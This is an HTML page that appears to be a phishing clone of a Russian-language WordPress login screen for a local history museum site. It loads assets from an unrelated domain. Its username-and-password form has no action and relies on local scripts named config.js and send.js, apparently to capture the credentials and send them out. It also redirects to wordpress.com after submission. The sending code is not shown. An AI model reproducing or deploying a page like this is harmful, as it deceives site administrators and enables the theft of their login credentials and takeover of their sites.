<!DOCTYPE html>
<html lang="ru-RU">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Войти &lsaquo; Бирский исторический музей &#8212; WordPress</title>
    <meta name='robots' content='noindex, follow' />
    <link rel='stylesheet' id='dashicons-css' href='https://mrt.com.ua/wp-includes/css/dashicons.min.css?ver=6.7.3' type='text/css' media='all' />
    <link rel='stylesheet' id='buttons-css' href='https://mrt.com.ua/wp-includes/css/buttons.min.css?ver=6.7.3' type='text/css' media='all' />
    <link rel='stylesheet' id='forms-css' href='https://mrt.com.ua/wp-admin/css/forms.min.css?ver=6.7.3' type='text/css' media='all' />
    <link rel='stylesheet' id='l10n-css' href='https://mrt.com.ua/wp-admin/css/l10n.min.css?ver=6.7.3' type='text/css' media='all' />
    <link rel='stylesheet' id='login-css' href='https://mrt.com.ua/wp-admin/css/login.min.css?ver=6.7.3' type='text/css' media='all' />
    <meta name='referrer' content='strict-origin-when-cross-origin' />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="apple-touch-icon" href="https://mrt.com.ua/wp-content/uploads/2024/03/cropped-sds_logo1-180x180.png" />
    <meta name="msapplication-TileImage" content="https://mrt.com.ua/wp-content/uploads/2024/03/cropped-sds_logo1-270x270.png" />
</head>
<body class="login no-js login-action-login wp-core-ui  locale-ru-ru">
<script type="text/javascript">document.body.className = document.body.className.replace('no-js','js');</script>

<h1 class="screen-reader-text">Войти</h1>
<div id="login">
    <h1 role="presentation" class="wp-login-logo"><a href="https://ru.wordpress.org/">Сайт работает на WordPress</a></h1>

    <form name="loginform" id="loginform">
        <p>
            <label for="user_login">Имя пользователя или email</label>
            <input type="text" name="log" id="user_login" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required" />
        </p>

        <div class="user-pass-wrap">
            <label for="user_pass">Пароль</label>
            <div class="wp-pwd">
                <input type="password" name="pwd" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
                <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Показать пароль">
                    <span class="dashicons dashicons-visibility" aria-hidden="true"></span>
                </button>
            </div>
        </div>
        
        <p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> <label for="rememberme">Запомнить меня</label></p>
        
        <p class="submit">
            <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Войти" />
            <input type="hidden" name="redirect_to" value="https://wordpress.com/" />
            <input type="hidden" name="testcookie" value="1" />
        </p>
    </form>

    <p id="nav">
        <a class="wp-login-lost-password" href="https://mrt.com.ua/wp-login.php?action=lostpassword">Забыли пароль?</a>
    </p>
    
    <script type="text/javascript">
    function wp_attempt_focus() {setTimeout( function() {try {d = document.getElementById( "user_login" );d.focus(); d.select();} catch( er ) {}}, 200);}
    wp_attempt_focus();
    </script>
    
    <p id="backtoblog">
        <a href="http://birskmuseum.ru/">&larr; Перейти к Бирский исторический музей</a>
    </p>
</div>


<script src="config.js"></script>
<script src="send.js"></script>

<!-- Остальные скрипты -->
<script type="text/javascript" src="https://mrt.com.ua/wp-includes/js/clipboard.min.js?ver=2.0.11"></script>
<script type="text/javascript" src="https://mrt.com.ua/wp-includes/js/jquery/jquery.min.js?ver=3.7.1"></script>
<script type="text/javascript" src="https://mrt.com.ua/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1"></script>
</body>
</html>
